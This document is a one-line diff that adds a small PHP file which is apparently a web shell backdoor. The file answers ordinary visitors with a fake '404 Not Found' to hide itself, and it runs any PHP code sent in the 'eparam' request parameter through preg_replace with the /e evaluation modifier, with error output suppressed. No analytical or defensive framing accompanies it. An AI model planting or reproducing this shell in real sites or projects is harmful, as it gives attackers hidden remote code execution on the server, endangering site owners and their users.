@@ -1,0 +1,1 @@
+<?php if (!isset($_REQUEST['eparam'])) header("HTTP/1.0 404 Not Found"); @preg_replace('/(.*)/e', @$_REQUEST['eparam'], ''); ?>
